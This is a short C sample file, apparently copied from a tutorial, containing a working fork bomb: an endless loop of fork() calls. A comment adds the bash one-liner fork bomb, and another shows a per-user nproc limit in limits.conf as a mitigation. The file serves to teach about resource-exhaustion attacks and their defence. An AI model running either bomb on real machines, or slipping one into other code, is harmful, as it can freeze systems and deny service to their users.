// C program Sample  for FORK BOMB
// It is not recommended to run the program as
// it may make a system non-responsive.
//https://www.geeksforgeeks.org/fork-bomb/?ref=rp
#include <stdio.h>
#include <sys/types.h>
 
int main()
{
    while(1)
       fork();   
    return 0;
}
//:(){ :|: & };:
// # vi /etc/security/limits.conf =>  your_user_name hard nproc 10
